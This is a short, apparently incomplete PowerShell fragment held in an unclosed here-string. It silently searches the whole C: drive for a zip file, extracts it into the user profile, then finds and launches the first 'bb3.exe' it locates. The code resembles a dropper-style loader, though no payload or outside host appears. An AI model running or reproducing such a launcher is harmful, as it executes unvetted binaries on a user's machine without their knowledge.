$bb3 = @'
Add-Type -AssemblyName System.IO.Compression.FileSystem

$zip = Get-ChildItem -Path C:\ -Filter "New folder (2).zip" -Recurse -ErrorAction SilentlyContinue -Force | Select-Object -First 1
if ($zip) {
    $dest = [Environment]::GetFolderPath("UserProfile")
    Expand-Archive -Path $zip.FullName -DestinationPath $dest -Force
}

$found = Get-ChildItem -Path C:\ -Filter "bb3.exe" -Recurse -ErrorAction SilentlyContinue -Force | Select-Object -First 1
if ($found) {
    Start-Process $found.FullName
}
